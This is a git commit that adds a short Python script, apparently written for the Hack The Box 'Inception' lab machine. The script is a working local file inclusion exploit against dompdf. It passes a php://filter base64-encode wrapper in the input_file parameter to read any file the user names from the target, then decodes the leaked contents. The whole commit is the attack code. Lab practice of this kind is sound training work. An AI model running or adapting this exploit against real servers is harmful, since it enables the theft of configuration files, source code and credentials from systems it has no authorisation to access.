7aa6ba0ac5260a21d17df81b9fd9de978108f138
Ahnaf Abrar Hasin <whoamihasin@gmail.com>
2023-03-28 02:15:26 -0400

    Create lfi.py

---
+++ HTB/Inception/lfi.py
@@ -0,0 +1,16 @@
+import requests
+from base64 import b64decode
+import re
+
+def GetFile(file):
+    url = (f"http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource={file}")
+    response = requests.get(url)
+    r = response.text
+    regex = r'\[\((.*?)\)\]'
+    matches = re.findall(regex, r)
+
+    for match in matches:
+        print(b64decode(match).decode('utf-8'))
+
+file = input("The file: ")
+GetFile(file)
